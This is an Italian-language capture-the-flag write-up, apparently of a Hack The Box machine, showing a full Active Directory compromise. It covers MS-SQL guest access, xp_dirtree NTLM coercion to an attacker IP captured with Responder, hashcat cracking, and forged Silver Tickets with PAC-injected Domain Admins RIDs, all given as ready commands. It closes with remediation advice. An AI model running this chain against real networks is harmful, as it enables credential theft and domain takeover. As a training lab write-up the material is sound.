# Scenario "Signed" – Kerberos Abuse & Active Directory Compromise

> **Contesto:** Assessment simulato su infrastruttura AD compromessa partendo da MS-SQL database esposto. L'attacco dimostra come una singola vulnerabilità applicativa possa propagarsi verso compromesso totale del dominio tramite NTLM credential interception e Kerberos Silver Ticket forging.

**Data Assessment:** Ottobre 2025  
**Ambiente:** Windows Server + Active Directory + MS-SQL  
**Tipo:** Infrastructure Penetration Testing  
**Risk:** CRITICAL 🔴  
**Metodologia:** PTES + Kerberos exploitation

---

## 1. Executive Summary

Partendo da MS-SQL esposto su rete con credenziali weak, è stato possibile compromettere completamente l'infrastruttura AD sfruttando una catena di vulnerabilità:

1. **Database Exposure** – MS-SQL accessibile con credenziali guest
2. **NTLM Coercion** – Forced SMB authentication via `xp_dirtree` → hash capture tramite Responder
3. **Credential Recovery** – Hash NTLMv2 crackato offline, accesso come `mssqlsvc`
4. **Kerberos Abuse** – Forgiatura di Silver Ticket via PAC manipulation
5. **Domain Takeover** – Accesso root al file system e leak di flag sensibili

L'impatto: **Dominio completamente compromesso**, accesso amministrativo, file system access.

---

## 2. Reconnaissance & Initial Access

Inizio con nmap classica:

```bash
sudo nmap -A --open -v -T4 -Pn 10.129.197.161 -oA Signed
```

Noto da subito che l'unica porta aperta è quella di `ms-sql` (porta 1433). Test credenziali iniziali:

```bash
impacket-mssqlclient -u scott -p tiger 10.129.197.161
```

Perfetto, connessione riuscita. Privilege: utente `guest`, molto limitato. Non posso lancia query avanzate, ma ho accesso ad una cosa interessante: la stored procedure `xp_dirtree`.

---

## 3. NTLM Credential Extraction via xp_dirtree

Dato che sono `guest`, non posso fare una mazza a livello di escalation diretta. Però ho scoperto una tecnica: se uso `xp_dirtree` puntando a un UNC path inesistente verso il mio IP, il database **lo tenta autenticare via SMB**. E lì, con un Responder in listening, catturi l'hash dell'account di servizio.

Setup:

```bash
sudo responder -I tun0
```

Dal database:

```sql
EXEC xp_dirtree '\\10.10.15.35\nonexistent';
```

Responder cattura:

```
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:1122334455667788:...
```

Hash captured. Perfetto.

---

## 4. Hash Cracking & Service Account Compromise

Dopo aver salvato l'hash, lo cracko con hashcat, modo 5600 (NTLMv2):

```bash
hashcat -m 5600 mssqlsvc_hash.txt /usr/share/wordlists/rockyou.txt --force
```

E grazie alla buona sorte, la password è crackabile. Accesso come `mssqlsvc`:

```bash
impacket-mssqlclient -u mssqlsvc -p 'EvilPassword123' 10.129.197.161
```

Output:

```
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Ora ho privilegi `dbo` sul database. Ma c'è un problema: anche se accendo `xp_cmdshell`, non riesco ad accedere a file sensibili. Perché? Perché il **processo MS-SQL** che esegue i comandi non ha i permessi OS per leggerli.

---

## 5. Domain SID Enumeration

Per craftare un Silver Ticket efficace devo estrarre il Domain SID. Query dal database:

```sql
SELECT name, sid, type, type_desc FROM sys.server_principals;
GO
```

Output (sample):

```
SIGNED\Administrator   | 0x01050000000000051500000...
SIGNED\Domain Admins   | 0x01050000000000051500000...
SIGNED\IT              | 0x01050000000000051500000519000C
```

Convertendo i binary SID al formato string (piccolo script Python):

```
Domain SID: S-1-5-21-4088429403-1159899800-2753317549
```

Prendo nota.

---

## 6. First Silver Ticket – Database Admin Access

Ora crafto il primo Silver Ticket. L'obiettivo: impersonare Administrator verso MS-SQL, abilitare `xp_cmdshell`, e leggere il flag utente.

```bash
impacket-ticketer \
  -nthash EF699384C3285C54128A3EE1DDB1A0CC \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn MSSQLSvc/dc01.signed.htb \
  -groups 1105 \
  -user-id 500 \
  Administrator
```

Output:

```
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/Administrator
[*] Saving ticket in Administrator.ccache
```

Assegno come variabile d'ambiente e connetto:

```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
```

Risultato:

```
SQL (SIGNED\Administrator  dbo@master)>
enable_xp_cmdshell
[*] Configuration option 'xp_cmdshell' changed from 0 to 1

xp_cmdshell 'type C:\Users\scott\Desktop\user.txt'
HTB{flaghere}
```

User flag ottenuto. Ma quando provo a leggere `C:\Users\Administrator\Desktop\root.txt`, accesso negato. Perché il processo MS-SQL **non è membro del gruppo Domain Admins a livello OS**.

---

## 7. PAC Manipulation & Second Silver Ticket

Dopo aver bestemmiato per una mezz'ora buona, realizzo: devo craftare un secondo ticket che NON sia Administrator, ma sia `mssqlsvc` **con membership ai gruppi Domain Admins nel PAC**.

Il PAC (Privilege Attribute Certificate) è la struttura dati dentro il ticket Kerberos che contiene i RID dei gruppi. Se lo forgio manualmente inserendo i RID 512 (Domain Admins) e 519 (Enterprise Admins), il servizio MS-SQL lo truста senza revalidare col KDC.

```bash
impacket-ticketer \
  -nthash EF699384C3285C54128A3EE1DDB1A0CC \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn MSSQLSvc/DC01.signed.htb:1433 \
  -groups 512,519,1105 \
  -user-id 1103 \
  mssqlsvc
```

Parametri cambiano: `-groups` ora contiene RID di Domain Admins (512) e `-user-id` è 1103 (RID custom). Assegno il ticket:

```bash
export KRB5CCNAME=mssqlsvc_admin.ccache
impacket-mssqlclient -k -no-pass dc01.signed.htb
```

Ora provo a leggere il root flag:

```sql
SQL (SIGNED\mssqlsvc  dbo@master)>
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
```

Success! Root flag ottenuto.

Il motivo per cui funziona: **il PAC forgiato dice al sistema che `mssqlsvc` è membro di Domain Admins. Il file system check vede il RID 512 nel token e concede accesso.**

---

## 8. Why This Works – Technical Breakdown

Il Kerberos assume che i token firmati siano **trustworthy**. Quando abbiamo l'NT hash dell'account di servizio (`mssqlsvc`), possiamo **forgiare il token completamente**, includendo il PAC con RID arbitrari.

**Differenze tra i due ticket:**

| Aspetto | Primo Ticket | Secondo Ticket |
|--------|-------------|---|
| **Utente** | Administrator (ID 500) | mssqlsvc (ID 1103) |
| **Gruppi** | [1105] (User) | [512, 519, 1105] (DA, EA, User) |
| **Accessibilità DB** | ✓ `dbo` + `xp_cmdshell` | ✓ `dbo` + `xp_cmdshell` |
| **Accessibilità File OS** | ✗ Processo non è DA | ✓ Processo eredita DA dal PAC |

Nel primo ticket, anche se **il nome dice Administrator**, il **processo MS-SQL gira come `mssqlsvc`** che non è membro di DA.

Nel secondo ticket, il PAC contiene il RID 512 (**Domain Admins**), quindi anche se il nome è `mssqlsvc`, il token ha i permessi necessari.

---

## 9. Attack Chain Visualization

```
┌─ Initial Access: MS-SQL exposed (port 1433)
├─ Stored Procedure Access: xp_dirtree → SMB auth coercion
├─ NTLM Hash Capture: Responder intercept
├─ Hash Cracking: Hashcat offline
├─ Service Account Escalation: mssqlsvc DB access
├─ SID Enumeration: Domain SID extraction
├─ Silver Ticket (1): DB Admin → User Flag
├─ PAC Manipulation: RID forging (Domain Admins membership)
├─ Silver Ticket (2): OS-level DA → Root Flag
└─ Domain Compromised
```

---

## 10. Remediation & Prevention

Mitigare questo tipo di attacco richiede **approccio multi-layer**:

**Immediate fixes:**
- Disabilitare `xp_dirtree` e `xp_cmdshell` sulle istanze MS-SQL che non li necessitano
- Enforce strong/complex passwords su service accounts
- Disabilitare LLMNR/NBT-NS via GPO (disarma Responder)

**Medium-term:**
- Migrare service accounts verso **Group Managed Service Accounts (gMSA)** → password auto-rotated ogni 30 giorni (infeasible crackare nel tempo necessario)
- Network segmentation: database VLAN isolata, solo app servers possono connettersi

**Long-term:**
- Migrate to Kerberos-only (disable NTLM completamente)
- Implement Zero-Trust model: conditional access basato su device posture
- Deploy SIEM con detection su `xp_dirtree` execution e anomalie Kerberos

---

## 11. Key Insights

Questo scenario dimostra il **classic progression**: una singola misconfiguration (DB esposto + xp_dirtree permessa) si propaga verso compromesso completo perché:

1. **Service account bridging** – Un account di servizio è il collegamento tra app layer e OS layer
2. **Token trust model** – Kerberos truста i token firmati senza revalidazione
3. **PAC forgery** – Se controlli l'account che firma i token, controlli i permessi

Non è **una** vulnerabilità, ma una **catena architetturale** dove ogni layer assume che il precedente sia sicuro, ma non è così.

---

**Assessment Completato: Ottobre 2025**
